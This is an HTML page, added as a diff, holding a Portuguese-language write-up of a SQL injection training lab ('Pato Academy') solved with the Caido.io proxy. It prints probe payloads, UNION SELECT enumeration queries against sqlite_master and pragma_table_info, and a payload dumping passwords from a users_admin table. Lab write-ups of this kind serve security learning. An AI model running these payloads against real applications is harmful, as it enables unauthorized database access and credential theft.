@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Exploração de SQL Injection com Caido.io</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 40px;
+      color: #333;
+    }
+    .container {
+      max-width: 900px;
+      margin: auto;
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h1, h2, h3 {
+      color: #2c3e50;
+    }
+    code, pre {
+      background-color: #eee;
+      padding: 6px 10px;
+      border-radius: 6px;
+      font-size: 0.95em;
+      display: block;
+      margin: 10px 0;
+      white-space: pre-wrap;
+    }
+    ul {
+      padding-left: 20px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 10px;
+    }
+    th, td {
+      border: 1px solid #ccc;
+      padding: 8px;
+      text-align: left;
+    }
+    th {
+      background-color: #f0f0f0;
+    }
+    img {
+      max-width: 100%;
+      margin-top: 20px;
+      border-radius: 6px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.1);
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>💼 Projeto: Exploração de SQL Injection com Caido.io</h1>
+    <p><strong>Autor:</strong> Matheus</p>
+    <p><strong>Ferramenta utilizada:</strong> Caido.io</p>
+    <p><strong>Desafio:</strong> Lab de SQL Injection – Pato Academy</p>
+    <p><strong>Objetivo:</strong> Identificar e explorar vulnerabilidades de SQL Injection em uma aplicação web simulada.</p>
+
+    <h2>🧠 Estratégia de Ataque</h2>
+
+    <h3>1. Reconhecimento da Aplicação</h3>
+    <ul>
+      <li>Navegação inicial para entender a estrutura da aplicação.</li>
+      <li>Identificação de endpoints dinâmicos como <code>/api/matches/{id}</code>.</li>
+      <li>Observação de parâmetros manipuláveis (<code>game, team</code>).</li>
+    </ul>
+
+    <h3>2. Interceptação e Testes com Caido.io</h3>
+    <ul>
+      <li>Captura de requisições HTTP para análise.</li>
+      <li>Testes com payloads básicos (<code>', '--, AND 1=1--</code>) revelaram mensagens de erro do SQLite.</li><br>
+      <li>Confirmação da vulnerabilidade de SQL Injection.</li>
+    </ul>
+
+    <h3>3. Enumeração da Estrutura Interna</h3>
+    <ul>
+      <li>Uso de <code>UNION SELECT</code> para descobrir o número de colunas (9).</li>
+      <li>Utilização da função <code>group_concat</code> para listar tabelas e colunas de forma agregada:</li>
+    </ul>
+    <pre>UNION SELECT group_concat(name, ':'), NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table'</pre>
+    <pre>SELECT group_concat(name, ', ') FROM pragma_table_info('users_admin')</pre>
+    <ul>
+      <li>Essa técnica permitiu mapear rapidamente a estrutura do banco e identificar alvos sensíveis como a tabela <code>users_admin</code>.</li>
+    </ul>
+<img src="images/sql-injection-1.png" alt="Payload executado com sucesso"><br><br>
+    <h3>4. Extração de Dados Sensíveis</h3>
+    <ul>
+      <li>Descoberta de colunas como <code>email, password, nickname</code>.</li>
+      <li>Execução de payload para extrair a flag:</li>
+    </ul>
+    <pre>' UNION SELECT password, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM users_admin--</pre>
+    <p><strong>Flag obtida:</strong> <code>$$$FLAG$$$oi_admin_vazou_seu_banco_aqui</code></p>
+<img src="images/sql-injection-2.png" alt="Credenciais extraídas via SQLi"><br><br>
+    <h2>📚 Aprendizados</h2>
+    <ul>
+      <li>A exploração manual com Caido.io permitiu entender a lógica da aplicação e manipular requisições com precisão.</li>
+      <li>A vulnerabilidade permitia acesso direto ao banco de dados SQLite, inclusive à tabela de administradores.</li>
+      <li>Técnicas como <code>UNION SELECT, PRAGMA table_info</code>, leitura do <code>sqlite_master</code> e uso de <code>group_concat</code> foram essenciais para mapear a estrutura interna e extrair dados com eficiência.</li>
+    </ul>
+
+    <h2>🛠️ Tecnologias e Ferramentas</h2>
+    <table>
+      <tr><th>Ferramenta</th><th>Função</th></tr>
+      <tr><td>Caido.io</td><td>Interceptação e manipulação de requisições</td></tr>
+      <tr><td>SQLite</td><td>Banco de dados utilizado pela aplicação</td></tr>
+      <tr><td>Pato Academy</td><td>Ambiente de simulação para testes de segurança</td></tr>
+    </table>
+
+    <h2>🎯 Resultado Final</h2>
+    <p>A exploração foi concluída com sucesso, demonstrando domínio de técnicas de SQL Injection e capacidade de análise manual. O projeto reforça habilidades em segurança ofensiva, análise de aplicações web e uso de ferramentas profissionais.</p>
+
+    <h2>📸 Evidências Visuais</h2>
+    <p>Você pode adicionar prints aqui para ilustrar os resultados:</p>
+ 
+  </div>
+</body>
+</html>
